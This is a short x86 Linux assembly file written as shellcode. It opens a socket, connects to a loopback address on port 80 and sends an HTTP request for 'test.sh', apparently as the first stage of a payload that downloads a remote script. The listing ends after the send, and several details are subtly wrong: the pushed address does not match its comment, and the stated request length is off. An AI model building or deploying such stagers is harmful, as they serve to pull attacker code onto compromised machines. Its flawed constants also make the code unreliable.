BITS 32
global _start
_start:

xor eax,eax
xor ebx,ebx
cdq

push byte 0x6
push byte 0x1
push byte 0x2
mov ecx,esp
inc bl
mov al,102
int 0x80
mov esi,eax

push edx
mov ecx, 0x0111117f ; 127.0.0.1 in little endian
push cx
push word 0x5000 ; port 80 in little endian
push word 0x02
mov eax,esp
push edx
push byte 0x10
push eax
push esi
mov ecx,esp
mov bl,0x3
xor eax,eax
mov al,102
xor edx,edx
int 0x80

push edx
push word 0x1d ; 29 (length)
push request
push esi
mov ecx,esp
mov bl,0x9
xor eax,eax
mov al,102
int 0x80

request:
    db 'GET /test.sh HTTP/1.0\r\n\r\n',0